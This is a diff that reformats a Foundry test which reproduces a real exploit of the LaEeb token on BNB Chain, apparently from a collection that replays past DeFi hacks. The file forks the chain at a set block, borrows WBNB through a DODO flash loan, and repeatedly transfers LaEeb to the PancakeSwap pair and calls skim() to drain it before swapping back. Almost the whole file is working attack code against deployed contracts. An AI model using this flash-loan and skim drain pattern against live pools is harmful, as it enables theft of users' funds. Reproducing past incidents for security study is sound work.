@@ -9,8 +9,7 @@ import "./../interface.sol";
 // Attack Contract : https://bscscan.com/address/0x9180981034364f683ea25bcce0cff5e03a595bef
 // GUY : https://x.com/MetaSec_xyz/status/1718964562165420076
 
-
-contract Exploit is Test{
+contract Exploit is Test {
     CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
     IERC20 WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
     IPancakePair Pair = IPancakePair(0x3921E8cb14e2C08DB989FDF88D01220a0C53cC91);
@@ -19,34 +18,32 @@ contract Exploit is Test{
     IDPPOracle private constant DPP = IDPPOracle(0x6098A5638d8D7e9Ed2f952d35B2b67c34EC6B476);
 
     function setUp() external {
-        cheats.createSelectFork("bsc", 33053187);
+        cheats.createSelectFork("bsc", 33_053_187);
     }
 
-       function testExploit() external {
+    function testExploit() external {
         emit log_named_decimal_uint("[Begin] Attacker WBNB before exploit", WBNB.balanceOf(address(this)), 18);
         DPP.flashLoan(8.6 ether, 0, address(this), abi.encode("Attack"));
         emit log_named_decimal_uint("[End] Attacker WBNB after exploit", WBNB.balanceOf(address(this)), 18);
-   
-
     }
+
     function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {
         swap_token_to_token(address(WBNB), address(LaEeb), 8.6 ether);
-        uint256 i=0;
-        while(i<10){
-            LaEeb.transfer(address(Pair), 3255594269218 ether);
+        uint256 i = 0;
+        while (i < 10) {
+            LaEeb.transfer(address(Pair), 3_255_594_269_218 ether);
             Pair.skim(address(this));
             i++;
         }
         swap_token_to_token(address(LaEeb), address(WBNB), LaEeb.balanceOf(address(this)));
-        WBNB.transfer(msg.sender,baseAmount);
+        WBNB.transfer(msg.sender, baseAmount);
     }
-    function swap_token_to_token(address a,address b,uint256 amount) internal {
+
+    function swap_token_to_token(address a, address b, uint256 amount) internal {
         IERC20(a).approve(address(Router), amount);
         address[] memory path = new address[](2);
         path[0] = address(a);
         path[1] = address(b);
-        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
-            amount, 0, path, address(this), block.timestamp
-        );
+        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(amount, 0, path, address(this), block.timestamp);
     }
 }
